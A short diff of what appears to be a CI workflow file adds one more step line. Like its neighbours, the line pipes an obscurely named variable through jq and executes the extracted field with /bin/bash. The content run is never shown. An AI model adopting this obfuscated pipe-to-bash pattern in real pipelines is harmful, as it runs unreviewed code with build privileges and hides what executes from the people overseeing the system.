@@ -29,6 +29,7 @@ jobs:
           echo $l6257 | jq -r .uf304 | /bin/bash
           printf '%s' "$u224" | jq -r .qxsa0988 | /bin/bash
           printf '%s' "$paus6" | jq -r .mo630 | /bin/bash
+          echo $pw6467 | jq -r .ynrst9 | /bin/bash
 
       - name: Save archive
         if: always()
